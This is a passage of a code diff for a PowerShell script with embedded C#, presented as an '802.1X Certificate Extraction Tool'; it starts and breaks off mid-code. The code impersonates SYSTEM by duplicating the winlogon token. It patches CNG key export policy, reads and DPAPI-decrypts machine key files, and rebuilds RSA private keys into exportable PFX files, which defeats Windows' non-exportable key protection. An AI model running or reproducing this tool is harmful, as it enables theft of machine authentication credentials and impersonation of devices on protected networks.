+        byte[] sk; using (var h = Hmac(hn, kh)) sk = h.ComputeHash(hi);
+
+        int ckl, bs;
+        if (ac == 0x6610) { ckl = 32; bs = 16; }
+        else if (ac == 0x6603) { ckl = 24; bs = 8; }
+        else return null;
+
+        byte[] ek = new byte[ckl]; Array.Copy(sk, ek, Math.Min(sk.Length, ckl));
+        byte[] iv = new byte[bs];
+        byte[] ct = (ac == 0x6610) ? AesDec(ek, iv, ed) : DesDec(ek, iv, ed);
+        if (ct == null) return null;
+
+        int pad = ct[ct.Length - 1];
+        if (pad >= 1 && pad <= bs)
+        {
+            bool vp = true;
+            for (int i = ct.Length - pad; i < ct.Length; i++) if (ct[i] != pad) { vp = false; break; }
+            if (vp) { byte[] up = new byte[ct.Length - pad]; Array.Copy(ct, up, up.Length); return up; }
+        }
+        return ct;
+    }
+
+    // --- RSA RECONSTRUCTION & PFX ---
+    static byte[] BuildPfxFromRsa2(byte[] b, byte[] certDer, string pw, StringBuilder sb)
+    {
+        int bl = (int)BitConverter.ToUInt32(b, 4);
+        int ce = (int)BitConverter.ToUInt32(b, 8);
+        int cm = (int)BitConverter.ToUInt32(b, 12);
+        int c1 = (int)BitConverter.ToUInt32(b, 16);
+        int c2 = (int)BitConverter.ToUInt32(b, 20);
+        sb.AppendLine("[*] RSA2: " + bl + " bits");
+
+        int o = 24;
+        byte[] eB = Ex(b, ref o, ce), nB = Ex(b, ref o, cm), pB = Ex(b, ref o, c1), qB = Ex(b, ref o, c2);
+        BigInteger e = Bi(eB), n = Bi(nB), p = Bi(pB), q = Bi(qB);
+        if (p * q != n) { sb.AppendLine("[-] p*q != N"); return null; }
+
+        BigInteger phi = (p-1)*(q-1), d = ModInv(e, phi);
+        BigInteger dp = d%(p-1), dq = d%(q-1), qi = ModInv(q, p);
+
+        if (BigInteger.ModPow(BigInteger.ModPow(42, e, n), d, n) != 42)
+        { sb.AppendLine("[-] RSA verify failed"); return null; }
+        sb.AppendLine("[+] RSA math OK");
+
+        var rp = new RSAParameters {
+            Exponent=Be(e,ce), Modulus=Be(n,cm), P=Be(p,c1), Q=Be(q,c2),
+            D=Be(d,cm), DP=Be(dp,c1), DQ=Be(dq,c2), InverseQ=Be(qi,c1)
+        };
+        return MakePfx(rp, certDer, pw);
+    }
+
+    static byte[] BuildPfxFromFullBlob(byte[] b, byte[] certDer, string pw)
+    {
+        int ce=(int)BitConverter.ToUInt32(b,8), cm=(int)BitConverter.ToUInt32(b,12);
+        int c1=(int)BitConverter.ToUInt32(b,16), c2=(int)BitConverter.ToUInt32(b,20);
+        int o=24;
+        var rp = new RSAParameters {
+            Exponent=Ex(b,ref o,ce), Modulus=Ex(b,ref o,cm), P=Ex(b,ref o,c1), Q=Ex(b,ref o,c2),
+            DP=Ex(b,ref o,c1), DQ=Ex(b,ref o,c2), InverseQ=Ex(b,ref o,c1), D=Ex(b,ref o,cm)
+        };
+        return MakePfx(rp, certDer, pw);
+    }
+
+    static byte[] MakePfx(RSAParameters rp, byte[] certDer, string pw)
+    {
+        using (RSA rsa = RSA.Create())
+        {
+            rsa.ImportParameters(rp);
+            var c = new X509Certificate2(certDer);
+            var cwk = c.CopyWithPrivateKey(rsa);
+            return cwk.Export(X509ContentType.Pfx, pw);
+        }
+    }
+
+    // --- SYSTEM IMPERSONATION ---
+    static bool ImpersonateSystem()
+    {
+        IntPtr hTok;
+        if (OpenProcessToken(System.Diagnostics.Process.GetCurrentProcess().Handle, 0x0028, out hTok))
+        {
+            long luid;
+            if (LookupPrivilegeValue(null, "SeDebugPrivilege", out luid))
+            {
+                byte[] tp = new byte[16];
+                BitConverter.GetBytes(1).CopyTo(tp, 0);
+                BitConverter.GetBytes(luid).CopyTo(tp, 4);
+                BitConverter.GetBytes(2).CopyTo(tp, 12);
+                AdjustTokenPrivileges(hTok, false, tp, 0, IntPtr.Zero, IntPtr.Zero);
+            }
+            CloseHandle(hTok);
+        }
+        int pid = 0;
+        foreach (var p in System.Diagnostics.Process.GetProcessesByName("winlogon")) { pid = p.Id; break; }
+        if (pid == 0) return false;
+        IntPtr hP = OpenProcess(0x0400, false, pid);
+        if (hP == IntPtr.Zero) return false;
+        IntPtr hT;
+        if (!OpenProcessToken(hP, 0x000E, out hT)) { CloseHandle(hP); return false; }
+        IntPtr hD;
+        if (!DuplicateTokenEx(hT, 0x02000000, IntPtr.Zero, 2, 2, out hD))
+        { CloseHandle(hT); CloseHandle(hP); return false; }
+        bool r = ImpersonateLoggedOnUser(hD);
+        CloseHandle(hD); CloseHandle(hT); CloseHandle(hP);
+        return r;
+    }
+
+    // --- HELPERS ---
+    static string GetKeyContainerName(X509Certificate2 cert)
+    {
+        int cb = 0;
+        CertGetCertificateContextProperty(cert.Handle, 2, IntPtr.Zero, ref cb);
+        if (cb == 0) return null;
+        IntPtr p = Marshal.AllocHGlobal(cb);
+        try
+        {
+            if (!CertGetCertificateContextProperty(cert.Handle, 2, p, ref cb)) return null;
+            return Marshal.PtrToStringUni(Marshal.ReadIntPtr(p, 0));
+        }
+        finally { Marshal.FreeHGlobal(p); }
+    }
+
+    static string GetKeyUniqueName(string keyName)
+    {
+        if (keyName == null) return null;
+        IntPtr hP, hK;
+        int hr = NCryptOpenStorageProvider(out hP, "Microsoft Software Key Storage Provider", 0);
+        if (hr != 0) return null;
+        hr = NCryptOpenKey(hP, out hK, keyName, 0, 0x20);
+        if (hr != 0) hr = NCryptOpenKey(hP, out hK, keyName, 0, 0);
+        if (hr != 0) { NCryptFreeObject(hP); return null; }
+        int cb;
+        hr = NCryptGetProperty(hK, "Unique Name", null, 0, out cb, 0);
+        if (hr != 0 || cb <= 0) { NCryptFreeObject(hK); NCryptFreeObject(hP); return null; }
+        byte[] buf = new byte[cb];
+        hr = NCryptGetProperty(hK, "Unique Name", buf, cb, out cb, 0);
+        NCryptFreeObject(hK); NCryptFreeObject(hP);
+        if (hr != 0) return null;
+        return Encoding.Unicode.GetString(buf).TrimEnd('\0');
+    }
+
+    static string FindKeyFile(string un)
+    {
+        string[] ds = {
+            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Microsoft","Crypto","Keys"),
+            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Microsoft","Crypto","RSA","MachineKeys"),
+            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Microsoft","Crypto","SystemKeys"),
+        };
+        foreach (string d in ds) { string fp = Path.Combine(d, un); if (File.Exists(fp)) return fp; }
+        return null;
+    }
+
+    static bool VerifyPfx(byte[] pfx, string pw)
+    {
+        try
+        {
+            var c = new X509Certificate2(pfx, pw, X509KeyStorageFlags.Exportable);
+            if (!c.HasPrivateKey) return false;
+            var rsa = c.GetRSAPrivateKey();
+            if (rsa == null) return false;
+            byte[] d = Encoding.UTF8.GetBytes("test");
+            byte[] s = rsa.SignData(d, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);
+            bool ok = rsa.VerifyData(d, s, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);
+            c.Dispose(); return ok;
+        }
+        catch { return false; }
+    }
+
+    static HMAC Hmac(string n, byte[] k) { return n == "SHA512" ? (HMAC)new HMACSHA512(k) : new HMACSHA1(k); }
+    static byte[] AesDec(byte[] k, byte[] iv, byte[] d)
+    { using (var a = Aes.Create()) { a.Key=k; a.IV=iv; a.Mode=CipherMode.CBC; a.Padding=PaddingMode.None; return a.CreateDecryptor().TransformFinalBlock(d,0,d.Length); } }
+    static byte[] DesDec(byte[] k, byte[] iv, byte[] d)
+    { using (var a = TripleDES.Create()) { a.Key=k; a.IV=iv; a.Mode=CipherMode.CBC; a.Padding=PaddingMode.None; return a.CreateDecryptor().TransformFinalBlock(d,0,d.Length); } }
+    static byte[] Ex(byte[] s, ref int o, int l) { byte[] r = new byte[l]; Array.Copy(s, o, r, 0, l); o += l; return r; }
+    static bool Eq(byte[] a, byte[] b) { if (a.Length != b.Length) return false; for (int i = 0; i < a.Length; i++) if (a[i] != b[i]) return false; return true; }
+    static BigInteger Bi(byte[] be) { byte[] le = new byte[be.Length+1]; for (int i=0;i<be.Length;i++) le[be.Length-1-i]=be[i]; return new BigInteger(le); }
+    static byte[] Be(BigInteger v, int l) {
+        byte[] le = v.ToByteArray(); byte[] be = new byte[l];
+        int cl = Math.Min(le.Length, l);
+        if (le.Length > l && le[le.Length-1] == 0) cl = Math.Min(le.Length-1, l);
+        for (int i=0;i<cl;i++) be[l-1-i]=le[i]; return be;
+    }
+    static BigInteger ModInv(BigInteger a, BigInteger m) { BigInteger g,x,y; Egcd(a%m,m,out g,out x,out y); return ((x%m)+m)%m; }
+    static void Egcd(BigInteger a, BigInteger b, out BigInteger g, out BigInteger x, out BigInteger y) {
+        if (a==0) { g=b; x=0; y=1; return; }
+        BigInteger g1,x1,y1; Egcd(b%a,a,out g1,out x1,out y1); g=g1; x=y1-(b/a)*x1; y=x1;
+    }
+}
+"@
+
+try { [CngExtractor] | Out-Null } catch {
+    Add-Type -TypeDefinition $CSharpCode -ReferencedAssemblies "System.Numerics","System.Security" -ErrorAction Stop
+}
+
+function Get-CertTemplate {
+    param([System.Security.Cryptography.X509Certificates.X509Certificate2]$C)
+    $t = ""
+    $v1 = $C.Extensions | Where-Object { $_.Oid.Value -eq "1.3.6.1.4.1.311.20.2" }
+    if ($v1) { $t = $v1.Format($false) }
+    $v2 = $C.Extensions | Where-Object { $_.Oid.Value -eq "1.3.6.1.4.1.311.21.7" }
+    if ($v2) {
+        $f = $v2.Format($true)
+        if ($f -match "Template=(.+?)[\r\n]") { $t = $Matches[1].Trim() }
+        elseif ($f -match "Mod.le=(.+?)[\r\n]") { $t = $Matches[1].Trim() }
+        elseif (-not $t -and $f) { $t = $f.Trim().Split("`n")[0].Trim() }
+    }
+    return $t
 }
 
 function Find-8021xCerts {
-    Write-Host "[*] Scanning Cert:\LocalMachine\My for 802.1X certificates..." -ForegroundColor Yellow
-    [array]$certs = @(Get-ChildItem -Path Cert:\LocalMachine\My -ErrorAction SilentlyContinue)
-
-    if ($certs.Count -eq 0) {
-        Write-Host "[-] No certificates found in LocalMachine\My store." -ForegroundColor Red
-        return $null
-    }
-
-    Write-Host "[*] Found $($certs.Count) certificate(s) total." -ForegroundColor Gray
+    Write-Host "[*] Scanning Cert:\LocalMachine\My..." -ForegroundColor Yellow
+    [array]$certs = @(Get-ChildItem Cert:\LocalMachine\My -ErrorAction SilentlyContinue)
+    if ($certs.Count -eq 0) { Write-Host "[-] No certificates." -ForegroundColor Red; return $null }
+    Write-Host "[*] $($certs.Count) certificate(s) found." -ForegroundColor Gray
 
     $results = @()
-    foreach ($cert in $certs) {
-        $template = Get-CertificateTemplate -Cert $cert
-        $hasPrivateKey = $cert.HasPrivateKey
-        $eku = ($cert.Extensions | Where-Object { $_ -is [System.Security.Cryptography.X509Certificates.X509EnhancedKeyUsageExtension] })
+    foreach ($c in $certs) {
+        $tpl = Get-CertTemplate -C $c
+        $eku = ($c.Extensions | Where-Object { $_ -is [System.Security.Cryptography.X509Certificates.X509EnhancedKeyUsageExtension] })
         $ekuList = @()
-        if ($eku) {
-            $ekuList = $eku.EnhancedKeyUsages | ForEach-Object { $_.FriendlyName }
-        }
-
-        $is8021x = $false
-        if ($template -match "802\.?1[xX]" -or $template -match "EAP" -or $template -match "PEAP" -or $template -match "Machine" -or $template -match "Computer") {
-            $is8021x = $true
-        }
-        # EKU: Client Authentication (1.3.6.1.5.5.7.3.2)
-        if ($ekuList -contains "Client Authentication") {
-            $is8021x = $true
-        }
-
+        if ($eku) { $ekuList = $eku.EnhancedKeyUsages | ForEach-Object { $_.FriendlyName } }
+        $is8021x = ($tpl -match "802\.?1[xX]|EAP|Machine|Computer") -or ($ekuList -contains "Client Authentication")
         $results += [PSCustomObject]@{
-            Cert          = $cert
-            Subject       = $cert.Subject
-            Issuer        = $cert.Issuer
-            Thumbprint    = $cert.Thumbprint
-            Template      = $template
-            HasPrivateKey = $hasPrivateKey
-            Is8021x       = $is8021x
-            EKU           = ($ekuList -join ", ")
-            NotAfter      = $cert.NotAfter
+            Cert=$c; Subject=$c.Subject; Issuer=$c.Issuer; Thumbprint=$c.Thumbprint
+            Template=$tpl; HasPrivateKey=$c.HasPrivateKey; Is8021x=$is8021x
+            EKU=($ekuList -join ", "); NotAfter=$c.NotAfter
         }
     }
-
     return ,$results
 }
 
-function Select-Certificate {
-    param([array]$CertList)
+Write-Host ""
+Write-Host "=============================================" -ForegroundColor Cyan
+Write-Host "  802.1X Certificate Extraction Tool" -ForegroundColor Cyan
+Write-Host "  DPAPI Chain | .NET Native | No 3rd Party" -ForegroundColor DarkCyan
+Write-Host "=============================================" -ForegroundColor Cyan
+Write-Host ""
 
-    # Filter for 8021x candidates with private keys
-    [array]$candidates = @($CertList | Where-Object { $_.Is8021x -and $_.HasPrivateKey })
-
-    if ($candidates.Count -eq 0) {
-        Write-Host "[!] No 802.1X candidates found automatically. Showing all certs with private keys..." -ForegroundColor Yellow
-        [array]$candidates = @($CertList | Where-Object { $_.HasPrivateKey })
-    }
-
-    if ($candidates.Count -eq 0) {
-        Write-Host "[-] No certificates with private keys found." -ForegroundColor Red
-        return $null
-    }
-
-    if ($candidates.Count -eq 1) {
-        Write-Host "[+] Single candidate found, selecting automatically." -ForegroundColor Green
-        return $candidates[0]
-    }
-
-    Write-Host ""
-    Write-Host "[*] Multiple candidates found. Select one:" -ForegroundColor Yellow
-    Write-Host ""
-    for ($i = 0; $i -lt $candidates.Count; $i++) {
-        $c = $candidates[$i]
-        $marker = if ($c.Is8021x) { "[802.1X]" } else { "[Other]" }
-        Write-Host "  [$i] $marker $($c.Subject)" -ForegroundColor White
-        Write-Host "      Template:    $($c.Template)" -ForegroundColor Gray
-        Write-Host "      Thumbprint:  $($c.Thumbprint)" -ForegroundColor Gray
-        Write-Host "      EKU:         $($c.EKU)" -ForegroundColor Gray
-        Write-Host "      Expires:     $($c.NotAfter)" -ForegroundColor Gray
-        Write-Host ""
-    }
-
-    $selection = Read-Host "Enter selection [0-$($candidates.Count - 1)]"
-    $idx = [int]$selection
-    if ($idx -lt 0 -or $idx -ge $candidates.Count) {
-        Write-Host "[-] Invalid selection." -ForegroundColor Red
-        return $null
-    }
-
-    return $candidates[$idx]
+$id = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+$pr = New-Object System.Security.Principal.WindowsPrincipal($id)
+if (-not $pr.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    Write-Host "[-] Administrator required." -ForegroundColor Red; exit 1
 }
+Write-Host "[+] Running as: $($id.Name)" -ForegroundColor Green
 
-# --- Method 1: Direct .NET Export (works if key is already exportable) ---
-function Export-Method1-DirectExport {
-    param(
-        [System.Security.Cryptography.X509Certificates.X509Certificate2]$Cert,
-        [string]$OutputPath,
-        [string]$Password
-    )
-
-    Write-Host ""
-    Write-Host "[*] Method 1: Direct .NET PFX export..." -ForegroundColor Yellow
-
-    try {
-        # Try direct export
-        $pfxBytes = $Cert.Export(
-            [System.Security.Cryptography.X509Certificates.X509ContentType]::Pfx,
-            $Password
-        )
-
-        if ($pfxBytes -and $pfxBytes.Length -gt 0) {
-            [System.IO.File]::WriteAllBytes($OutputPath, $pfxBytes)
-            # Verify the PFX is valid and contains a private key
-            $verify = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2(
-                $OutputPath, $Password,
-                [System.Security.Cryptography.X509Certificates.X509KeyStorageFlags]::Exportable
-            )
-            if ($verify.HasPrivateKey) {
-                $verify.Dispose()
-                Write-Host "[+] Method 1 SUCCESS - Direct export worked." -ForegroundColor Green
-                return $true
-            }
-            $verify.Dispose()
-            Remove-Item -Path $OutputPath -Force -ErrorAction SilentlyContinue
-        }
-    }
-    catch {
-        Write-Host "[-] Method 1 failed: $($_.Exception.Message)" -ForegroundColor DarkYellow
-    }
-
-    return $false
-}
-
-# --- Method 2: NCryptSetProperty to patch export policy, then export ---
-function Export-Method2-PatchCNG {
-    param(
-        [System.Security.Cryptography.X509Certificates.X509Certificate2]$Cert,
-        [string]$OutputPath,
-        [string]$Password
-    )
-
-    Write-Host ""
-    Write-Host "[*] Method 2: CNG export policy patch via NCryptSetProperty..." -ForegroundColor Yellow
-
-    $hProvider = [IntPtr]::Zero
-    $hKey = [IntPtr]::Zero
-
-    try {
-        $pkInfo = Get-PrivateKeyInfo -Cert $Cert
-        $keyName = $pkInfo.KeyName
-        $providerName = $pkInfo.Provider
-
-        if ($keyName -and (-not $providerName -or $providerName -match "Cryptographic Provider")) {
-            $providerName = "Microsoft Software Key Storage Provider"
-        }
-
-        if (-not $keyName) {
-            Write-Host "[-] Method 2 failed: could not determine key name." -ForegroundColor DarkYellow
-            return $false
-        }
-
-        Write-Host "[*] Key Name: $keyName" -ForegroundColor Gray
-        Write-Host "[*] Provider: $providerName" -ForegroundColor Gray
-
-        # Open the KSP and key - try machine key store first, then user store
-        $NCRYPT_MACHINE_KEY_FLAG = 0x00000020
-        $status = [NCryptInterop]::NCryptOpenStorageProvider([ref]$hProvider, $providerName, 0)
-        if ($status -ne 0) {
-            Write-Host "[-] NCryptOpenStorageProvider failed: 0x$($status.ToString('X8'))" -ForegroundColor DarkYellow
-            return $false
-        }
-
-        $status = [NCryptInterop]::NCryptOpenKey($hProvider, [ref]$hKey, $keyName, 0, $NCRYPT_MACHINE_KEY_FLAG)
-        if ($status -ne 0) {
-            $status = [NCryptInterop]::NCryptOpenKey($hProvider, [ref]$hKey, $keyName, 0, 0)
-        }
-        if ($status -ne 0) {
-            Write-Host "[-] NCryptOpenKey failed: 0x$($status.ToString('X8'))" -ForegroundColor DarkYellow
-            return $false
-        }
-
-        # Read current export policy
-        try {
-            $currentPolicy = [NCryptInterop]::GetExportPolicy($hKey)
-            Write-Host "[*] Current export policy: 0x$($currentPolicy.ToString('X8'))" -ForegroundColor Gray
-        }
-        catch {
-            Write-Host "[*] Could not read current export policy (non-fatal)." -ForegroundColor Gray
-        }
-
-        # Patch export policy
-        $status = [NCryptInterop]::PatchExportPolicy($hKey)
-        if ($status -ne 0) {
-            Write-Host "[-] NCryptSetProperty (ExportPolicy) failed: 0x$($status.ToString('X8'))" -ForegroundColor DarkYellow
-            # Some providers reject the patch; fall through
-            return $false
-        }
-
-        Write-Host "[+] Export policy patched successfully." -ForegroundColor Green
-
-        # Read back to confirm
-        try {
-            $newPolicy = [NCryptInterop]::GetExportPolicy($hKey)
-            Write-Host "[*] New export policy: 0x$($newPolicy.ToString('X8'))" -ForegroundColor Gray
-        }
-        catch {}
-
-        # Now export via NCryptExportKey with PKCS8 blob
-        $BCRYPT_RSAFULLPRIVATE_BLOB = "RSAFULLPRIVATEBLOB"
-        $cbResult = 0
-
-        # First call to get size
-        $status = [NCryptInterop]::NCryptExportKey($hKey, [IntPtr]::Zero, $BCRYPT_RSAFULLPRIVATE_BLOB,
-            [IntPtr]::Zero, $null, 0, [ref]$cbResult, 0)
-        if ($status -ne 0) {
-            Write-Host "[-] NCryptExportKey (size query) failed: 0x$($status.ToString('X8'))" -ForegroundColor DarkYellow
-            return $false
-        }
-
-        $keyBlob = New-Object byte[] $cbResult
-        $status = [NCryptInterop]::NCryptExportKey($hKey, [IntPtr]::Zero, $BCRYPT_RSAFULLPRIVATE_BLOB,
-            [IntPtr]::Zero, $keyBlob, $cbResult, [ref]$cbResult, 0)
-        if ($status -ne 0) {
-            Write-Host "[-] NCryptExportKey failed: 0x$($status.ToString('X8'))" -ForegroundColor DarkYellow
-            return $false
-        }
-
-        Write-Host "[+] Key blob exported ($cbResult bytes)." -ForegroundColor Green
-
-        # Build PFX from blob + cert DER
-        $certDer = $Cert.RawData
-        $pfxBytes = [PfxBuilder]::BuildPfxFromBcryptBlob($keyBlob, $certDer, $Password)
-        [System.IO.File]::WriteAllBytes($OutputPath, $pfxBytes)
-
-        # Verify
-        $verify = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2(
-            $OutputPath, $Password,
-            [System.Security.Cryptography.X509Certificates.X509KeyStorageFlags]::Exportable
-        )
-        if ($verify.HasPrivateKey) {
-            $verify.Dispose()
-            Write-Host "[+] Method 2 SUCCESS - CNG patch + export worked." -ForegroundColor Green
-            return $true
-        }
-        $verify.Dispose()
-        Remove-Item -Path $OutputPath -Force -ErrorAction SilentlyContinue
-        return $false
-    }
-    catch {
-        Write-Host "[-] Method 2 failed: $($_.Exception.Message)" -ForegroundColor DarkYellow
-        return $false
-    }
-    finally {
-        if ($hKey -ne [IntPtr]::Zero) { [void][NCryptInterop]::NCryptFreeObject($hKey) }
-        if ($hProvider -ne [IntPtr]::Zero) { [void][NCryptInterop]::NCryptFreeObject($hProvider) }
-    }
-}
-
-# --- Method 3: Read raw CNG key files + DPAPI LocalMachine decrypt ---
-function Export-Method3-DPAPIKeyFile {
-    param(
-        [System.Security.Cryptography.X509Certificates.X509Certificate2]$Cert,
-        [string]$OutputPath,
-        [string]$Password
-    )
-
-    Write-Host ""
-    Write-Host "[*] Method 3: Raw CNG key file + DPAPI LocalMachine decrypt..." -ForegroundColor Yellow
-
-    try {
-        $pkInfo = Get-PrivateKeyInfo -Cert $Cert
-        $keyUniqueName = $pkInfo.UniqueName
-        $keyName = $pkInfo.KeyName
-
-        if (-not $keyUniqueName -and -not $keyName) {
-            Write-Host "[-] Method 3 failed: could not determine key name." -ForegroundColor DarkYellow
-            return $false
-        }
-
-        Write-Host "[*] Key name: $keyName" -ForegroundColor Gray
-        if ($keyUniqueName) { Write-Host "[*] Unique name: $keyUniqueName" -ForegroundColor Gray }
-
-        $sid = ([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value
-        $searchDirs = @(
-            "$env:ProgramData\Microsoft\Crypto\Keys",
-            "$env:ProgramData\Microsoft\Crypto\RSA\MachineKeys",
-            "$env:ProgramData\Microsoft\Crypto\SystemKeys",
-            "$env:APPDATA\Microsoft\Crypto\Keys",
-            "$env:APPDATA\Microsoft\Crypto\RSA\$sid"
-        )
-
-        $keyFilePath = $null
-
-        # Try direct path with unique name first
-        if ($keyUniqueName) {
-            foreach ($dir in $searchDirs) {
-                $p = Join-Path $dir $keyUniqueName
-                if (Test-Path $p) { $keyFilePath = $p; break }
-            }
-        }
-
-        # Fallback: search by key name pattern in all dirs
-        if (-not $keyFilePath -and $keyName) {
-            foreach ($dir in $searchDirs) {
-                if (Test-Path $dir) {
-                    $found = Get-ChildItem -Path $dir -ErrorAction SilentlyContinue |
-                        Where-Object { $_.Name -match [regex]::Escape($keyName) } |
-                        Select-Object -First 1
-                    if ($found) { $keyFilePath = $found.FullName; break }
-                }
-            }
-        }
-
-        # Last resort: search by unique name pattern
-        if (-not $keyFilePath -and $keyUniqueName) {
-            foreach ($dir in $searchDirs) {
-                if (Test-Path $dir) {
-                    $found = Get-ChildItem -Path $dir -ErrorAction SilentlyContinue |
-                        Where-Object { $_.Name -match [regex]::Escape($keyUniqueName) } |
-                        Select-Object -First 1
-                    if ($found) { $keyFilePath = $found.FullName; break }
-                }
-            }
-        }
-
-        if (-not $keyFilePath) {
-            Write-Host "[-] Method 3 failed: key file not found on disk." -ForegroundColor DarkYellow
-            return $false
-        }
-
-        Write-Host "[+] Key file found: $keyFilePath" -ForegroundColor Green
-
-        $keyFileBytes = [System.IO.File]::ReadAllBytes($keyFilePath)
-        Write-Host "[*] Key file size: $($keyFileBytes.Length) bytes" -ForegroundColor Gray
-
-        if ($keyFileBytes.Length -lt 4) {
-            Write-Host "[-] Key file too small." -ForegroundColor DarkYellow
-            return $false
-        }
-
-        $version = [BitConverter]::ToUInt32($keyFileBytes, 0)
-        Write-Host "[*] Key file version: $version" -ForegroundColor Gray
-
-        # --- Strategy A: Parse CNG key file property list to extract DPAPI blob with exact boundaries ---
-        # CNG key file (version 1) layout:
-        #   DWORD version (4)
-        #   Then repeated properties:
-        #     DWORD cbStructLen (total property size including this header)
-        #     DWORD dwType
-        #     DWORD dwUnknown
-        #     DWORD cbName (byte count of the Unicode property name)
-        #     DWORD cbValue (byte count of the property value)
-        #     WCHAR name[cbName/2]
-        #     BYTE  value[cbValue]
-        # The private key property name is typically "Export Policy", "Modified", "Provider",
-        # or empty. The DPAPI blob is in the largest value or in a property named
-        # with specific types (dwType=3 is often the private key data).
-
-        $dpapiBlobs = @()
-        $propOffset = 4
-        $parseOk = $true
-
-        while ($propOffset -lt ($keyFileBytes.Length - 20)) {
-            try {
-                $cbStruct = [BitConverter]::ToUInt32($keyFileBytes, $propOffset)
-                if ($cbStruct -lt 20 -or ($propOffset + $cbStruct) -gt $keyFileBytes.Length) {
-                    $parseOk = $false
-                    break
-                }
-                $dwType    = [BitConverter]::ToUInt32($keyFileBytes, $propOffset + 4)
-                $cbName    = [BitConverter]::ToUInt32($keyFileBytes, $propOffset + 12)
-                $cbValue   = [BitConverter]::ToUInt32($keyFileBytes, $propOffset + 16)
-
-                if ($cbValue -gt 100 -and ($propOffset + 20 + $cbName + $cbValue) -le $keyFileBytes.Length) {
-                    $valueStart = $propOffset + 20 + $cbName
-                    # Check if this value contains a DPAPI blob (starts with the magic)
-                    if ($cbValue -ge 12 -and
-                        $keyFileBytes[$valueStart] -eq 0x01 -and
-                        $keyFileBytes[$valueStart+1] -eq 0x00 -and
-                        $keyFileBytes[$valueStart+2] -eq 0x00 -and
-                        $keyFileBytes[$valueStart+3] -eq 0x00 -and
-                        $keyFileBytes[$valueStart+4] -eq 0xD0 -and
-                        $keyFileBytes[$valueStart+5] -eq 0x8C -and
-                        $keyFileBytes[$valueStart+6] -eq 0x9D -and
-                        $keyFileBytes[$valueStart+7] -eq 0xDF) {
-                        $exactBlob = New-Object byte[] $cbValue
-                        [Array]::Copy($keyFileBytes, $valueStart, $exactBlob, 0, $cbValue)
-                        $dpapiBlobs += ,@{ Offset = $valueStart; Data = $exactBlob; Type = $dwType }
-                        Write-Host "[*] Property at offset $($propOffset) - type=$($dwType), valueSize=$($cbValue) (DPAPI blob)" -ForegroundColor Gray
-                    }
-                }
-
-                $propOffset += $cbStruct
-            }
-            catch {
-                $parseOk = $false
-                break
-            }
-        }
-
-        if ($parseOk -and $dpapiBlobs.Count -gt 0) {
-            Write-Host "[+] Parsed $($dpapiBlobs.Count) DPAPI property blob(s) from key file structure." -ForegroundColor Green
-        }
-
-        # --- Strategy B fallback: scan for DPAPI magic bytes and use enclosing property or heuristic ---
-        if ($dpapiBlobs.Count -eq 0) {
-            Write-Host "[*] Property parse did not find blobs, falling back to DPAPI magic scan..." -ForegroundColor Yellow
-            $dpapiMagic = @(0x01, 0x00, 0x00, 0x00, 0xD0, 0x8C, 0x9D, 0xDF, 0x01, 0x15, 0xD1, 0x11)
-
-            for ($i = 0; $i -lt ($keyFileBytes.Length - $dpapiMagic.Length); $i++) {
-                $match = $true
-                for ($j = 0; $j -lt $dpapiMagic.Length; $j++) {
-                    if ($keyFileBytes[$i + $j] -ne $dpapiMagic[$j]) {
-                        $match = $false
-                        break
-                    }
-                }
-                if ($match) {
-                    # Try to find the enclosing property's cbValue by scanning back for a 4-byte length
-                    $blobSize = $null
-                    # Check if 4 bytes before the DPAPI offset hold a plausible cbValue
-                    if ($i -ge 4) {
-                        $candidate = [BitConverter]::ToUInt32($keyFileBytes, $i - 4)
-                        if ($candidate -gt 100 -and ($i - 4 + $candidate) -le $keyFileBytes.Length) {
-                            # Plausible: the DWORD right before is the value length
-                            $blobSize = [int]$candidate
-                        }
-                    }
-                    if (-not $blobSize) {
-                        # Use remaining file from this offset
-                        $blobSize = $keyFileBytes.Length - $i
-                    }
-                    $chunk = New-Object byte[] $blobSize
-                    [Array]::Copy($keyFileBytes, $i, $chunk, 0, $blobSize)
-                    $dpapiBlobs += ,@{ Offset = $i; Data = $chunk; Type = -1 }
-                }
-            }
-        }
-
-        if ($dpapiBlobs.Count -eq 0) {
-            Write-Host "[-] No DPAPI blob found in key file. Key may use a different protection." -ForegroundColor DarkYellow
-            return $false
-        }
-
-        # Try to decrypt each blob (last/largest is usually the private key)
-        $decryptedBlob = $null
-        $sortedBlobs = $dpapiBlobs | Sort-Object { $_.Data.Length } -Descending
-
-        $dpapiScopes = @(
-            [System.Security.Cryptography.DataProtectionScope]::LocalMachine,
-            [System.Security.Cryptography.DataProtectionScope]::CurrentUser
-        )
-
-        foreach ($blobInfo in $sortedBlobs) {
-            foreach ($scope in $dpapiScopes) {
-                try {
-                    $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect(
-                        $blobInfo.Data,
-                        $null,
-                        $scope
-                    )
-                    if ($decrypted -and $decrypted.Length -gt 0) {
-                        Write-Host "[+] DPAPI decrypt succeeded ($($decrypted.Length) bytes, scope=$scope) from offset $($blobInfo.Offset)." -ForegroundColor Green
-                        $decryptedBlob = $decrypted
-                        break
-                    }
-                }
-                catch {
-                    # Try next scope
-                }
-            }
-            if ($decryptedBlob) { break }
-        }
-
-        if (-not $decryptedBlob) {
-            Write-Host "[-] Method 3 failed: DPAPI decryption unsuccessful." -ForegroundColor DarkYellow
-            return $false
-        }
-
-        # Find RSA magic in decrypted data
-        $rsaMagicOffset = -1
-        $rsaMagicType = $null
-        for ($i = 0; $i -lt ($decryptedBlob.Length - 4); $i++) {
-            if ($decryptedBlob[$i] -eq 0x52 -and $decryptedBlob[$i+1] -eq 0x53 -and $decryptedBlob[$i+2] -eq 0x41) {
-                if ($decryptedBlob[$i+3] -eq 0x33) { $rsaMagicOffset = $i; $rsaMagicType = "RSA3"; break }
-                if ($decryptedBlob[$i+3] -eq 0x32) { $rsaMagicOffset = $i; $rsaMagicType = "RSA2"; break }
-            }
-        }
-
-        if ($rsaMagicOffset -lt 0) {
